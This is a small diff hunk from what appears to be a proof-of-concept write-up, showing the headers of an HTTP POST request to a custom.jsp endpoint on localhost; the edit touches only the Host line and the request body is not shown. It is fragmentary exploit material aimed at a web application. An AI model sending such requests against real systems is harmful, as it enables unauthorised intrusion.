@@ -37,7 +37,7 @@ POC：
 
 ```
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
-Host: 127.0.0.1
+Host: 127.0.0.1
 User-Agent: Go-http-client/1.1
 Content-Length: 60
 Content-Type: application/x-www-form-urlencoded
